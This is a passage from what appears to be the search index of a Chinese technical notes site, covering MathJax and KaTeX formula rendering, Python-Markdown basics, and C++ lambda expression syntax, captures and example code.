MathJax\u662f\u4e00\u4e2a\u663e\u793a\u7f51\u7edc\u4e0a\u6570\u5b66\u516c\u5f0f\u7684\u5f00\u6e90JavaScript\u5f15\u64ce\u5e93\uff0c\u5b83\u53ef\u4ee5\u5728\u6240\u6709\u6d4f\u89c8\u5668\u4e0a\u9762\u5de5\u4f5c\uff0c\u5176\u4e2d\u5c31\u652f\u6301LaTeX\uff0cMathML\u548cAsciiMath \u7b26\u53f7\uff0c\u91cc\u9762\u7684\u6570\u5b57\u4f1a\u88abMathJax\u4f7f\u7528JavaScript\u5f15\u64ce\u89e3\u6790\u6210HTML\uff0cSVG\u6216\u8005\u662fMathML \u65b9\u7a0b\u5f0f\uff0c\u7136\u540e\u5728\u73b0\u4ee3\u7684\u6d4f\u89c8\u5668\u91cc\u9762\u663e\u793a\u3002 \u5b83\u7684\u8bbe\u8ba1\u76ee\u6807\u662f\u5229\u7528\u6700\u65b0\u7684web\u6280\u672f\uff0c\u6784\u5efa\u4e00\u4e2a\u652f\u6301math\u7684web\u5e73\u53f0\u3002\u652f\u6301\u4e3b\u8981\u7684\u6d4f\u89c8\u5668\u548c\u64cd\u4f5c\u7cfb\u7edf,\u5305\u62ec\u90a3\u4e9b\u79fb\u52a8\u8bbe\u5907\u3002 KaTeX \uff1a \u53ef\u6c57\u5b66\u9662\u51fa\u54c1\uff0c\u53f7\u79f0\u201c\u6700\u5feb\u201d\u7684\u6570\u5b66\u516c\u5f0f\u6e32\u67d3\u5e93\u3002\u652f\u6301\u4e3b\u6d41\u7684\u6d4f\u89c8\u5668\uff1aChrome, Firefox, Safari, Opera\u548c IE8-IE11\u3002\u6709\u4ee5\u4e0b\u4f18\u70b9\uff1a \u5feb\u901f\uff1a\u5e76\u53d1\u6e32\u67d3\uff0c\u65e0\u9700\u91cd\u6392\u9875\u9762\u3002\u6839\u636e\u8fd9\u4e2a\u6d4b\u8bd5\uff0c\u6027\u80fd\u7edd\u5bf9\u79d2\u6740MathJax\uff1b \u6e32\u67d3\u6548\u679c\u597d\uff1a\u91c7\u7528TeX\u8bed\u6cd5\uff0c\u6e32\u67d3\u6548\u679c\u8fbe\u5230\u5370\u5237\u51fa\u7248\u7ea7\u522b\uff1b \u65e0\u4f9d\u8d56\uff1a\u4e0d\u4f9d\u8d56\u5176\u5b83\u5e93\uff1b \u652f\u6301\u670d\u52a1\u5668\u7aef\u6e32\u67d3\uff1a\u4f8b\u5982\uff0c\u670d\u52a1\u5668\u7aef\u7684Node.js\u7a0b\u5e8f\u8c03\u7528KaTeX\uff0c\u628a\u6e32\u67d3\u597d\u7684HTML\u7247\u6bb5\u76f4\u63a5\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002 VS Code\u7684 Markdown preview enhanced\uff08MPE\uff09\u63d2\u4ef6\u652f\u6301 MathJax \u548c KaTeX \u4e24\u7c7b\u6e32\u67d3\u5f15\u64ce\u3002\u603b\u7ed3\u6765\u8bf4\uff0c\u4e24\u8005\u7684\u7279\u70b9\u5982\u4e0b\uff1a MathJax \u6e32\u67d3\u66f4\u5feb\uff0c\u652f\u6301\u82e5\u5e72\u7b80\u5199\u5b57\u7b26\uff0c\u4f46\u662f\u672c\u8eab\u652f\u6301\u7684\u8303\u56f4\u8f83\u5c0f\uff1b KaTeX \u6e32\u67d3\u7a0d\u6162\uff0c\u652f\u6301\u66f4\u591a\u590d\u6742\u7684\u8868\u793a \u53e6\u5916\uff0c Typora \u7528\u7684\u4e5f\u662f MathJax \u5f15\u64ce\uff0c\u5374\u80fd\u5b9e\u73b0\u66f4\u591a\u7684\u529f\u80fd\uff0c\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u7248\u672c\u95ee\u9898\u3002 \u53c2\u8003\u8d44\u6599\uff1a Online LaTeX Equation Editor - create, integrate and download Tex \u79d1\u5b66\u516c\u5f0f\u8bed\u8a00 (TeX/LaTeX) \u4e00\u4efd\u4e0d\u592a\u7b80\u77ed\u7684 LATEX 2\u03b5 \u4ecb\u7ecd LaTeX\u5982\u4f55\u6e32\u67d3\uff1f \u884c\u5185 MathJax \u516c\u5f0f\u4f7f\u7528\u65b9\u6cd5\uff0c\u6bd4\u5982\u8fd9\u4e2a\u5316\u5b66\u516c\u5f0f\uff1a $\\ce{Hg^2+ ->[I-] HgI2 ->[I-] [Hg^{II}I4]^2-}$ MathJax \u5757\u516c\u5f0f\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a $$H(D_2) = -\\left(\\frac{2}{4}\\log_2 \\frac{2}{4} + \\frac{2}{4}\\log_2 \\frac{2}{4}\\right) = 1$$ \u77e9\u9635\uff1a $$ \\begin{pmatrix} 1 & a_1 & a_1^2 & \\cdots & a_1^n \\\\ 1 & a_2 & a_2^2 & \\cdots & a_2^n \\\\ \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 1 & a_m & a_m^2 & \\cdots & a_m^n \\\\ \\end{pmatrix} $$ This is an extension for Python Markdown which adds KaTeX support. ```math f(x) = \\int_{-\\infty}^\\infty \\hat f(\\xi)\\,e^{2 \\pi i \\xi x} \\,d\\xi ``` \u5f88\u591a\u5e73\u53f0\uff0c\u6bd4\u5982\u77e5\u4e4e\u3001CSDN\u652f\u6301\u516c\u5f0f\uff0c\u5bf9\u4e8e\u5fae\u4fe1\u4e0d\u652f\u6301\u8fd9\u79cd\u4e0d\u652f\u6301\u7684\uff0c\u76ee\u524d\u7684\u89e3\u51b3\u65b9\u6848\u662f\u8f6c\u6210 svg \u56fe\u7247\u653e\u5230\u5fae\u4fe1\u4e2d\uff0c\u65e0\u9700\u8c03\u6574\uff0c\u77e2\u91cf\u4e0d\u5931\u771f\u3002","title":"3.10. \u6570\u5b66\u516c\u5f0f"},{"location":"markdown/#python-markdown","text":"","title":"4. Python-Markdown"},{"location":"markdown/#python-markdown-introduction","text":"\u8fd9\u662f John Gruber \u7684 Markdown \u7684 Python \u5b9e\u73b0\u3002\u5c3d\u7ba1\u5b58\u5728\u4e00\u4e9b\u5df2\u77e5\u95ee\u9898\uff0c\u4f46\u5b83\u51e0\u4e4e\u5b8c\u5168\u7b26\u5408\u53c2\u8003\u5b9e\u73b0\u3002 \u6709\u5173\u786e\u5207\u652f\u6301\u548c\u4e0d\u652f\u6301\u7684\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u529f\u80fd \u3002 \u53ef\u7528\u6269\u5c55 \u652f\u6301\u9644\u52a0\u529f\u80fd\u3002","title":"4.1. \u4ecb\u7ecd"},{"location":"markdown/#python-markdown-documentation","text":"pip install markdown import markdown html = markdown.markdown(your_text_string) \u6709\u5173\u66f4\u9ad8\u7ea7\u7684 \u5b89\u88c5 \u548c \u4f7f\u7528 \u6587\u6863\uff0c \u8bf7\u53c2\u9605 docs/ \u53d1\u884c\u7248\u76ee\u5f55\u6216\u9879\u76ee\u7f51\u7ad9 https://Python-Markdown.github.io/ \u3002 Third Party Extensions","title":"4.2. \u6587\u6863"},{"location":"markdown/#references","text":"Markdown \u5b98\u65b9\u6559\u7a0b This is the first footnote. \u21a9 Here's one with multiple paragraphs and code. Indent paragraphs to include them in the footnote. { my code } Add as many paragraphs as you like. \u21a9","title":"5. \u53c2\u8003\u8d44\u6599"},{"location":"cplusplus/lambda/","text":"Lambda \u8868\u8fbe\u5f0f \uf0c1 \u6784\u9020\u95ed\u5305\uff1a\u80fd\u591f\u6355\u83b7\u4f5c\u7528\u57df\u4e2d\u7684\u53d8\u91cf\u7684\u65e0\u540d\u51fd\u6570\u5bf9\u8c61\u3002since C++11 \u8bed\u6cd5 \uf0c1 [ captures ] ( params ) specs requires(optional) { body } (1) [ captures ] { body } (2) (until C++23) [ captures ] specs { body } (2) (since C++23) [ captures ] < tparams > requires(optional) ( params ) specs requires(optional) { body } (3) (since C++20) [ captures ] < tparams > requires(optional) { body } (4) (since C++20) (until C++23) [ captures ] < tparams > requires(optional) specs { body } (4) (since C++23) \u5b8c\u6574\u58f0\u660e\u3002 \u7701\u7565\u5f62\u53c2\u5217\u8868\uff1a\u51fd\u6570\u4e0d\u63a5\u6536\u5b9e\u53c2\uff0c\u5982\u540c\u5f62\u53c2\u5217\u8868\u662f () \u3002 \u4e0e 1 \u76f8\u540c\uff0c\u4f46\u6307\u5b9a\u6cdb\u578b lambda \u5e76\u663e\u5f0f\u63d0\u4f9b\u6a21\u677f\u5f62\u53c2\u5217\u8868\u3002 \u4e0e 2 \u76f8\u540c\uff0c\u4f46\u6307\u5b9a\u6cdb\u578b lambda \u5e76\u663e\u5f0f\u63d0\u4f9b\u6a21\u677f\u5f62\u53c2\u5217\u8868\u3002 \u89e3\u91ca \uf0c1 captures - \u5305\u542b\u96f6\u6216\u66f4\u591a\u4e2a \u6355\u83b7\u7b26 \u7684\u9017\u53f7\u5206\u9694\u5217\u8868\uff0c\u53ef\u4ee5 \u9ed8\u8ba4\u6355\u83b7\u7b26\uff08capture-default\uff09 \u8d77\u59cb\u3002 \u6709\u5173\u6355\u83b7\u7b26\u7684\u8be6\u7ec6\u63cf\u8ff0\uff0c\u89c1 \u4e0b\u6587 \u3002 \u5982\u679c\u53d8\u91cf\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\uff0c\u90a3\u4e48 lambda \u8868\u8fbe\u5f0f\u5728\u4f7f\u7528\u5b83\u524d\u4e0d\u9700\u8981\u5148\u6355\u83b7\uff1a \u8be5\u53d8\u91cf\u662f\u975e\u5c40\u90e8\u53d8\u91cf\uff0c\u6216\u5177\u6709\u9759\u6001\u6216\u7ebf\u7a0b\u5c40\u90e8 \u5b58\u50a8\u671f \uff08\u6b64\u65f6\u65e0\u6cd5\u6355\u83b7\u8be5\u53d8\u91cf\uff09\uff0c\u6216\u8005 \u8be5\u53d8\u91cf\u662f\u4ee5 \u5e38\u91cf\u8868\u8fbe\u5f0f \u521d\u59cb\u5316\u7684\u5f15\u7528\u3002 \u5982\u679c\u53d8\u91cf\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\uff0c\u90a3\u4e48 lambda \u8868\u8fbe\u5f0f\u5728\u8bfb\u53d6\u5b83\u7684\u503c\u524d\u4e0d\u9700\u8981\u5148\u6355\u83b7\uff1a \u8be5\u53d8\u91cf\u5177\u6709 const \u800c\u975e volatile \u7684\u6574\u578b\u6216\u679a\u4e3e\u7c7b\u578b\uff0c\u5e76\u5df2\u7ecf\u7528 \u5e38\u91cf\u8868\u8fbe\u5f0f \u521d\u59cb\u5316\uff0c\u6216\u8005 \u8be5\u53d8\u91cf\u662f constexpr \u7684\u4e14\u6ca1\u6709 mutable \u6210\u5458\u3002 tparams - \uff08\u89d2\u62ec\u53f7\u4e2d\u7684\uff09\u6a21\u677f\u5f62\u53c2\u5217\u8868\uff0c\u7528\u4e8e\u4e3a\u6cdb\u578b lambda \u63d0\u4f9b\u5404\u6a21\u677f\u5f62\u53c2\u7684\u540d\u5b57\uff08\u89c1\u4e0b\u6587\u7684 ClosureType::operator()\uff09\u3002\u4e0e\u5728\u6a21\u677f\u58f0\u660e\u4e2d\u76f8\u4f3c\uff0c\u6a21\u677f\u5f62\u53c2\u5217\u8868\u53ef\u4ee5\u540e\u9644 requires \u5b50\u53e5\uff0c\u5b83\u6307\u5b9a\u5404\u6a21\u677f\u5b9e\u53c2\u4e0a\u7684 \u7ea6\u675f \u3002 \u6a21\u677f\u5f62\u53c2\u5217\u8868\u4e0d\u80fd\u4e3a\u7a7a\uff08\u4e0d\u5141\u8bb8 <>\uff09\u3002 params - \u5f62\u53c2\u5217\u8868\uff0c\u5982\u5728 \u5177\u540d\u51fd\u6570 \u4e2d\u3002 specs - \u7531 specifiers \u3001 exception \u3001 attr \u548c trailing-return-type \u6309\u987a\u5e8f\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7ec4\u5206\u5747\u975e\u5fc5\u9700 specifiers - \u53ef\u9009\u7684\u8bf4\u660e\u7b26\u7684\u5e8f\u5217\u3002\u4e0d\u63d0\u4f9b\u8bf4\u660e\u7b26\u65f6\u590d\u5236\u6355\u83b7\u7684\u5bf9\u8c61\u5728 lambda \u51fd\u6570\u4f53\u5185\u662f const \u7684\u3002\u53ef\u4ee5\u4f7f\u7528\u4e0b\u5217\u8bf4\u660e\u7b26\uff1a mutable: \u5141\u8bb8 \u51fd\u6570\u4f53 \u4fee\u6539\u590d\u5236\u6355\u83b7\u7684\u5bf9\u8c61\uff0c\u4ee5\u53ca\u8c03\u7528\u5b83\u4eec\u7684\u975e const \u6210\u5458\u51fd\u6570 constexpr: \u663e\u5f0f\u6307\u5b9a\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u8fd0\u7b97\u7b26\u6a21\u677f\u7684\u4efb\u610f\u7279\u5316\u4e3a constexpr \u51fd\u6570\u3002\u5982\u679c\u6ca1\u6709\u6b64\u8bf4\u660e\u7b26\u4f46\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u4efb\u610f\u7ed9\u5b9a\u7684\u8fd0\u7b97\u7b26\u6a21\u677f\u7279\u5316\u6070\u597d\u6ee1\u8db3\u9488\u5bf9 constexpr \u51fd\u6570\u7684\u6240\u6709\u8981\u6c42\uff0c\u90a3\u4e48\u5b83\u4e5f\u4f1a\u662f constexpr \u7684\u3002 (C++17 \u8d77) consteval\uff1a\u6307\u5b9a\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u4efb\u610f\u7ed9\u5b9a\u7684\u8fd0\u7b97\u7b26\u6a21\u677f\u7279\u5316\u4e3a \u7acb\u5373\u51fd\u6570 \u3002\u4e0d\u80fd\u540c\u65f6\u4f7f\u7528 consteval \u548c constexpr\u3002 (C++20 \u8d77) exception - \u4e3a\u95ed\u5305\u7c7b\u578b\u7684 operator() \u63d0\u4f9b \u52a8\u6001\u5f02\u5e38\u8bf4\u660e \u6216 (C++20 \u524d) noexcept \u8bf4\u660e\u7b26 attr - \u4e3a\u95ed\u5305\u7c7b\u578b\u7684\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u8fd0\u7b97\u7b26\u6a21\u677f\u7684\u7c7b\u578b\u63d0\u4f9b \u5c5e\u6027\u8bf4\u660e \u3002\u8fd9\u6837\u6307\u5b9a\u7684\u4efb\u4f55\u5c5e\u6027\u5747\u5c5e\u4e8e\u51fd\u6570\u8c03\u7528\u8fd0\u7b97\u7b26\u6216\u8fd0\u7b97\u7b26\u6a21\u677f\u7684\u7c7b\u578b\uff0c\u800c\u975e\u5176\u81ea\u8eab\u3002\uff08\u4f8b\u5982\u4e0d\u80fd\u4f7f\u7528 [[ noreturn ]]\uff09 trailing-return-type - -> \u8fd4\u56de\u7c7b\u578b \uff0c\u5176\u4e2d \u8fd4\u56de\u7c7b\u578b \u6307\u5b9a\u8fd4\u56de\u7c7b\u578b\u3002\u5982\u679c\u6ca1\u6709 \u5c3e\u968f\u8fd4\u56de\u7c7b\u578b \uff0c\u90a3\u4e48\u95ed\u5305\u7684 operator() \u7684\u8fd4\u56de\u7c7b\u578b\u4ece return \u8bed\u53e5\u63a8\u5bfc\uff0c\u5982\u540c\u5bf9\u4e8e\u58f0\u660e\u8fd4\u56de\u7c7b\u578b\u4e3a auto \u7684\u51fd\u6570\u7684\u63a8\u5bfc\u4e00\u6837\u3002 requires - (C++20 \u8d77)\u5411\u95ed\u5305\u7c7b\u578b\u7684 operator() \u6dfb\u52a0 \u7ea6\u675f body - \u51fd\u6570\u4f53 \u5f53\u4ee5 auto \u4e3a\u5f62\u53c2\u7c7b\u578b\u6216\u663e\u5f0f\u63d0\u4f9b\u6a21\u677f\u5f62\u53c2\u5217\u8868 (C++20 \u8d77)\u65f6\uff0c\u8be5 lambda \u662f\u6cdb\u578b lambda\u3002(C++14 \u8d77) Lambda \u6355\u83b7 \uf0c1 \u6355\u83b7 \u662f\u4e00\u4e2a\u542b\u6709\u96f6\u6216\u66f4\u591a\u4e2a\u6355\u83b7\u7b26\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\uff0c\u53ef\u4ee5 \u9ed8\u8ba4\u6355\u83b7\u7b26 \u5f00\u59cb\u3002\u9ed8\u8ba4\u6355\u83b7\u7b26\u53ea\u6709 &\uff08\u4ee5\u5f15\u7528\u9690\u5f0f\u6355\u83b7\u88ab\u4f7f\u7528\u7684\u81ea\u52a8\u53d8\u91cf\uff09\u548c =\uff08\u4ee5\u590d\u5236\u9690\u5f0f\u6355\u83b7\u88ab\u4f7f\u7528\u7684\u81ea\u52a8\u53d8\u91cf\uff09\u3002 \u5f53\u51fa\u73b0\u4efb\u4e00\u9ed8\u8ba4\u6355\u83b7\u7b26\u65f6\uff0c\u90fd\u80fd\u9690\u5f0f\u6355\u83b7\u5f53\u524d\u5bf9\u8c61\uff08 *this \uff09\u3002\u82e5\u9690\u5f0f\u6355\u83b7\u5b83\uff0c\u5219\u59cb\u7ec8\u4ee5\u5f15\u7528\u6355\u83b7\uff0c\u5373\u4f7f\u9ed8\u8ba4\u6355\u83b7\u7b26\u662f =\u3002\u5f53\u9ed8\u8ba4\u6355\u83b7\u7b26\u4e3a = \u65f6\uff0c *this \u7684\u9690\u5f0f\u6355\u83b7\u88ab\u5f03\u7528\u3002 (C++20 \u8d77) \u6355\u83b7 \u4e2d\u5355\u72ec\u7684\u6355\u83b7\u7b26\u7684\u8bed\u6cd5\u662f: \u6807\u8bc6\u7b26 (1) \u6807\u8bc6\u7b26 ... (2) \u6807\u8bc6\u7b26 \u521d\u59cb\u5316\u5668 (3) (C++14 \u8d77) & \u6807\u8bc6\u7b26 (4) & \u6807\u8bc6\u7b26 ... (5) & \u6807\u8bc6\u7b26 \u521d\u59cb\u5316\u5668 (6) (C++14 \u8d77) this (7) * this (8) (C++17 \u8d77) ... \u6807\u8bc6\u7b26 \u521d\u59cb\u5316\u5668 (9) (C++20 \u8d77) & ... \u6807\u8bc6\u7b26 \u521d\u59cb\u5316\u5668 (10) (C++20 \u8d77) \u7b80\u5355\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u4f5c\u4e3a\u5305\u5c55\u5f00\u7684\u7b80\u5355\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u5e26\u521d\u59cb\u5316\u5668\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u7b80\u5355\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u4f5c\u4e3a\u5305\u5c55\u5f00\u7684\u7b80\u5355\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u5e26\u521d\u59cb\u5316\u5668\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u5f53\u524d\u5bf9\u8c61\u7684\u7b80\u5355\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u5f53\u524d\u5bf9\u8c61\u7684\u7b80\u5355\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u521d\u59cb\u5316\u5668\u4e3a\u5305\u5c55\u5f00\u7684\u4ee5\u590d\u5236\u6355\u83b7 \u521d\u59cb\u5316\u5668\u4e3a\u5305\u5c55\u5f00\u7684\u4ee5\u5f15\u7528\u6355\u83b7 \u5f53\u9ed8\u8ba4\u6355\u83b7\u7b26\u662f & \u65f6\uff0c\u540e\u7ee7\u7684\u7b80\u5355\u6355\u83b7\u7b26\u4e0d\u80fd\u4ee5 & \u5f00\u59cb\u3002 struct S2 { void f(int i); }; void S2::f(int i) { [&]{}; // OK\uff1a\u9ed8\u8ba4\u4ee5\u5f15\u7528\u6355\u83b7 [&, i]{}; // OK\uff1a\u4ee5\u5f15\u7528\u6355\u83b7\uff0c\u4f46 i \u4ee5\u503c\u6355\u83b7 [&, &i] {}; // \u9519\u8bef\uff1a\u4ee5\u5f15\u7528\u6355\u83b7\u4e3a\u9ed8\u8ba4\u65f6\u7684\u4ee5\u5f15\u7528\u6355\u83b7 [&, this] {}; // OK\uff1a\u7b49\u4ef7\u4e8e [&] [&, this, i]{}; // OK\uff1a\u7b49\u4ef7\u4e8e [&, i] } \u5f53\u9ed8\u8ba4\u6355\u83b7\u7b26\u662f = \u65f6\uff0c\u540e\u7ee7\u7684\u7b80\u5355\u6355\u83b7\u7b26\u5fc5\u987b\u4ee5 & \u5f00\u59cb\uff0c\u6216\u8005\u4e3a *this (C++17 \u8d77) \u6216 this (C++20 \u8d77)\u3002 struct S2 { void f(int i); }; void S2::f(int i) { [=]{}; // OK\uff1a\u9ed8\u8ba4\u4ee5\u590d\u5236\u6355\u83b7 [=, &i]{}; // OK\uff1a\u4ee5\u590d\u5236\u6355\u83b7\uff0c\u4f46 i \u4ee5\u5f15\u7528\u6355\u83b7 [=, *this]{}; // C++17 \u524d\uff1a\u9519\u8bef\uff1a\u65e0\u6548\u8bed\u6cd5 // C++17 \u8d77\uff1aOK\uff1a\u4ee5\u590d\u5236\u6355\u83b7\u5916\u56f4\u7684 S2 [=, this] {}; // C++20 \u524d\uff1a\u9519\u8bef\uff1a= \u4e3a\u9ed8\u8ba4\u65f6\u7684 this // C++20 \u8d77\uff1aOK\uff1a\u540c [=] } \u4efb\u4f55\u6355\u83b7\u7b26\u53ea\u53ef\u4ee5\u51fa\u73b0\u4e00\u6b21\uff1a struct S2 { void f(int i); }; void S2::f(int i) { [i, i] {}; // \u9519\u8bef\uff1ai \u91cd\u590d [this, *this] {}; // \u9519\u8bef\uff1a\"this\" \u91cd\u590d (C++17) } \u4eff\u51fd\u6570 \uf0c1 \u5728C++11\u4e4b\u524d\uff0cSTL\u4e2d\u7684\u4e00\u4e9b\u7b97\u6cd5\u9700\u8981\u4f7f\u7528\u4e00\u79cd\u51fd\u6570\u5bf9\u8c61---\u4eff\u51fd\u6570(functor)\uff1b\u5176\u672c\u8d28\u662f\u91cd\u65b0\u5b9a\u4e49\u548c\u6210\u5458\u51fd\u6570 operator() \uff0c\u4f7f\u5176\u4f7f\u7528\u4e0a\u5f88\u50cf\u666e\u901a\u51fd\u6570\uff0c\u5176\u5b9e\uff0c\u7ec6\u5fc3\u7684\u6211\u4eec\u5df2\u7ecf\u53d1\u73b0\uff0cLambda\u51fd\u6570\u4e0e\u4eff\u51fd\u6570\u4f3c\u4e4e\u6709\u4e00\u4e9b\u9ed8\u5951\u3002 \u5982\u4e0b\u4f8b\u5b50\uff1a\u6298\u6263 class Price { private: float _rate; public: Price(float rate):_rate(rate){} float operator()(float price) { return price*(1 - _rate / 100); } }; int main(int argc, char* argv[]) { float rate=5.5f; Price c1(rate); auto c2 = [rate](float price)->float {return price*(1 - rate / 100); }; float p1 = c1(3699); //\u4eff\u51fd\u6570 float p2 = c2(3699); //Lambda\u51fd\u6570 return 0; } \u4eff\u51fd\u6570\u4ee5rate\u521d\u59cb\u5316,Lambda\u6355\u6349rate\u53d8\u91cf\uff0c\u53c2\u6570\u4f20\u9012\u4e0a\uff0c\u4e24\u8005\u4e00\u81f4\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u4eff\u51fd\u6570\u5c31\u662f\u5b9e\u73b0Lambda\u51fd\u6570\u4e00\u79cd\u65b9\u5f0f\uff0c\u7f16\u8bd1\u5668\u901a\u5e38\u4f1a\u628aLambda\u51fd\u6570\u8f6c\u6362\u4e3a\u4e00\u4e2a\u4eff\u51fd\u6570\u5bf9\u8c61\uff0c\u4f46\u662f\u4eff\u51fd\u6570\u7684\u8bed\u6cd5\u5374\u7ed9\u6211\u4eec\u5e26\u6765\u4e86\u5f88\u5927\u7684\u4fbf\u6377\u3002 \u5728C++11\u4e2d\uff0cLambda\u51fd\u6570\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u5f88\u591a\u4eff\u51fd\u6570\u88ab\u53d6\u4ee3\u3002 \u793a\u4f8b \uf0c1 int main(int argc, char* argv[]) { int a = 5, b = 7; auto total = [](int x, int y)->int {return x + y; }; //\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570 cout << total(a, b)<<endl; //12 auto fun1 = [=] {return a + b; }; //\u503c\u4f20\u9012\u6355\u6349\u7236\u4f5c\u7528\u57df\u53d8\u91cf cout << fun1() << endl; //12 auto fun2 = [&](int c) {b = a + c; a = 1; }; //\u7701\u7565\u4e86\u8fd4\u56de\u503c\u7c7b\u578b\uff0c\u5f15\u7528\u6355\u83b7\u6240\u6709 fun2(3); cout << a <<\" \"<< b << endl; //1 8 a = 5; b = 7; //\u88ab\u4fee\u6539\u540e\uff0c\u91cd\u65b0\u8d4b\u503c auto fun3 = [=, &b](int c) mutable {b = a + c; a = 1; }; //\u4ee5\u503c\u4f20\u9012\u6355\u6349\u7684\u53d8\u91cf\uff0c\u5728\u51fd\u6570\u4f53\u91cc\u5982\u679c\u8981\u4fee\u6539\uff0c\u8981\u52a0mutaple,\u56e0\u4e3a\u9ed8\u8ba4const\u4fee\u9970 fun3(3); cout << a << \" \" <<b<< endl; //5 8 a = 5; b = 7; //\u88ab\u4fee\u6539\u540e\uff0c\u91cd\u65b0\u8d4b\u503c auto fun4 = [=](int x, int y) mutable->int {a += x; b += y; return a + b; }; int t = fun4(10, 20); cout << t << endl; //42 cout << a <<\" \"<< b << endl; //5 7 return 0; } \u5757\u4f5c\u7528\u57df\u4ee5\u5916\u7684Lambda\u51fd\u6570\u6355\u6349\u5217\u8868\u5fc5\u987b\u4e3a\u7a7a\uff0c\u56e0\u6b64\u8fd9\u6837\u7684\u51fd\u6570\u9664\u4e86\u8bed\u6cd5\u4e0a\u7684\u4e0d\u540c\uff0c\u548c\u666e\u901a\u51fd\u6570\u533a\u522b\u4e0d\u5927\u3002 \u5757\u4f5c\u7528\u57df\u4ee5\u5185\u7684Lambda\u51fd\u6570\u4ec5\u80fd\u6355\u6349\u5757\u4f5c\u7528\u57df\u4ee5\u5185\u7684\u81ea\u52a8\u53d8\u91cf\uff0c\u6355\u6349\u4efb\u4f55\u975e\u6b64\u4f5c\u7528\u57df\u6216\u975e\u81ea\u52a8\u53d8\u91cf(\u9759\u6001\u53d8\u91cf)\uff0c\u90fd\u4f1a\u5f15\u8d77\u7f16\u8bd1\u5668\u62a5\u9519\u3002 \u4e0b\u9762\u793a\u4f8b\u6f14\u793a\u5982\u4f55\u4f20\u9012 lambda \u7ed9\u6cdb\u578b\u7b97\u6cd5\uff0c\u4ee5\u53ca lambda \u8868\u8fbe\u5f0f\u6240\u4ea7\u751f\u7684\u5bf9\u8c61\u80fd\u5982\u4f55\u5b58\u50a8\u4e8e std::function \u5bf9\u8c61\u3002 #include <vector> #include <iostream> #include <algorithm> #include <functional> int main() { std::vector<int> c = {1, 2, 3, 4, 5, 6, 7}; int x = 5; c.erase(std::remove_if(c.begin(), c.end(), [x](int n) { return n < x; }), c.end()); std::cout << \"c: \"; std::for_each(c.begin(), c.end(), [](int i){ std::cout << i << ' '; }); std::cout << '\\n'; // the type of a closure cannot be named, but can be inferred with auto // since C++14, lambda could own default arguments auto func1 = [](int i = 6) { return i + 4; }; std::cout << \"func1: \" << func1() << '\\n'; // like all callable objects, closures can be captured in std::function // (this may incur unnecessary overhead) std::function<int(int)> func2 = [](int i) { return i + 4; }; std::cout << \"func2: \" << func2(6) << '\\n'; constexpr int fib_max {8}; std::cout << \"Emulate `recursive lambda` calls:\\nFibonacci numbers: \"; auto nth_fibonacci = [](int n) { std::function<int(int, int, int)> fib = [&](int n, int a, int b) { return n ? fib(n - 1, a + b, a) : b; }; return fib(n, 0, 1); }; for (int i{1}; i <= fib_max; ++i) { std::cout << nth_fibonacci(i) << (i < fib_max ? \", \" : \"\\n\"); } std::cout << \"Alternative approach to lambda recursion:\\nFibonacci numbers: \"; auto nth_fibonacci2 = [](auto self, int n, int a = 0, int b = 1) -> int { return n ? self(self, n - 1, a + b, a) : b; }; for (int i{1}; i <= fib_max; ++i) { std::cout << nth_fibonacci2(nth_fibonacci2, i) << (i < fib_max ? \", \" : \"\\n\"); } #ifdef __cpp_explicit_this_parameter std::cout << \"C++23 approach to lambda recursion:\\n\"; auto nth_fibonacci3 = [](this auto self, int n, int a = 0, int b = 1) { return n ? self(n - 1, a + b, a) : b; }; for (int i{1}; i <= fib_max; ++i) { std::cout << nth_fibonacci3(i) << (i < fib_max ? \", \" : \"\\n\"); } #endif } Possible output: c: 5 6 7 func1: 10 func2: 10 Emulate `recursive lambda` calls: Fibonacci numbers: 0, 1, 1, 2, 3, 5, 8, 13 Alternative approach to lambda recursion: Fibonacci numbers: 0, 1, 1, 2, 3, 5, 8, 13 \u53c2\u8003\u8d44\u6599 \uf0c1 Lambda expressions: https://en.cppreference.com/w/cpp/language/lambda Lambda expressions: https://zh.cppreference.com/w/cpp/language/lambda","title":"Lambda"},{"location":"cplusplus/lambda/#lambda-expressions","text":"\u6784\u9020\u95ed\u5305\uff1a\u80fd\u591f\u6355\u83b7\u4f5c\u7528\u57df\u4e2d\u7684\u53d8\u91cf\u7684\u65e0\u540d\u51fd\u6570\u5bf9\u8c61\u3002since C++11","title":"Lambda \u8868\u8fbe\u5f0f"},{"location":"cplusplus/lambda/#syntax","text":"[ captures ] ( params ) specs requires(optional) { body } (1) [ captures ] { body } (2) (until C++23) [ captures ] specs { body } (2) (since C++23) [ captures ] < tparams > requires(optional) ( params ) specs requires(optional) { body } (3) (since C++20) [ captures ] < tparams > requires(optional) { body } (4) (since C++20) (until C++23) [ captures ] < tparams > requires(optional) specs { body } (4) (since C++23) \u5b8c\u6574\u58f0\u660e\u3002 \u7701\u7565\u5f62\u53c2\u5217\u8868\uff1a\u51fd\u6570\u4e0d\u63a5\u6536\u5b9e\u53c2\uff0c\u5982\u540c\u5f62\u53c2\u5217\u8868\u662f () \u3002 \u4e0e 1 \u76f8\u540c\uff0c\u4f46\u6307\u5b9a\u6cdb\u578b lambda \u5e76\u663e\u5f0f\u63d0\u4f9b\u6a21\u677f\u5f62\u53c2\u5217\u8868\u3002 \u4e0e 2 